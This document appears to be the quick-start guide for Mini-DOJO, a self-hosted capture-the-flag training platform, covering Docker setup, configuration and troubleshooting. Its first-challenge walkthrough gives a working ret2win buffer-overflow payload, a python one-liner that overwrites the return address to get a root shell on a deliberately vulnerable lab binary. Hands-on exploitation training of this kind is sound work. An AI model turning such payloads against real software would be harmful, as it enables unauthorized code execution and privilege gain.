# 🚀 Quick Start Guide

Get Mini-DOJO running in 5 minutes!

## Prerequisites

- Docker Engine 20.10+
- Docker Compose v2.0+
- Linux host or Docker Desktop (Windows/Mac)

## Installation Steps

### 1. Build Challenge Image

```bash
cd mini-dojo/challenges/dojo1-ret2win/
docker build -t mini-dojo/dojo1-ret2win:latest .
cd ../../
```

### 2. Start All Services

```bash
docker compose up --build
```

Wait for the services to start. You should see:
```
✓ Database initialized
✓ Seeded challenge: dojo1-ret2win
```

### 3. Access the Platform

Open your browser and navigate to:

**http://127.0.0.1:8080**

### 4. Register & Login

1. Click "Register"
2. Create a username and password
3. You'll be automatically logged in

### 5. Solve Your First Challenge

1. Click "View Challenge" on "Dojo 1: ret2win"
2. Click "Start Workspace"
3. Click the terminal URL (e.g., `http://127.0.0.1:30000`)
4. In the terminal, run:
   ```bash
   /challenge/challenge
   ```
5. Note the address of `win()` (e.g., `0x4011e6`)
6. Exploit the binary:
   ```bash
   python3 -c 'import sys; sys.stdout.buffer.write(b"A"*72 + (0x4011e6).to_bytes(8, "little"))' | /challenge/challenge
   ```
7. You should get a root shell (`#` prompt)
8. Read the flag:
   ```bash
   cat /flag
   ```
9. Submit the flag on the web page

## Stopping the Platform

```bash
docker compose down
```

To also remove the database volume:
```bash
docker compose down -v
```

## Configuration

Edit environment variables in `docker-compose.yml`:

| Variable | Description | Default |
|----------|-------------|---------|
| `HOST_PUBLIC` | Public hostname for workspace URLs | `127.0.0.1` |
| `PORT_RANGE_START` | Start of port range for workspaces | `30000` |
| `PORT_RANGE_END` | End of port range for workspaces | `31000` |
| `WORKSPACE_TTL_HOURS` | Hours before workspace auto-cleanup | `6` |
| `SECRET_KEY` | Session encryption key | `super-secret-key-change-in-production` |

## Troubleshooting

### Port Already in Use

If port 8080 is already in use, edit `docker-compose.yml`:
```yaml
web:
  ports:
    - "9090:8080"  # Change 8080 to 9090 or any free port
```

### Permission Denied (Docker Socket)

On Linux, ensure your user is in the `docker` group:
```bash
sudo usermod -aG docker $USER
newgrp docker
```

### Container Fails to Start

Check logs:
```bash
docker compose logs web
docker compose logs cleanup
```

## Next Steps

- Add more challenges in `challenges/` directory
- Customize the UI in `web/templates/`
- Adjust resource limits in `web/app.py`
- Set up a reverse proxy (nginx) for production
- Enable HTTPS with Let's Encrypt

Happy hacking! 🥋
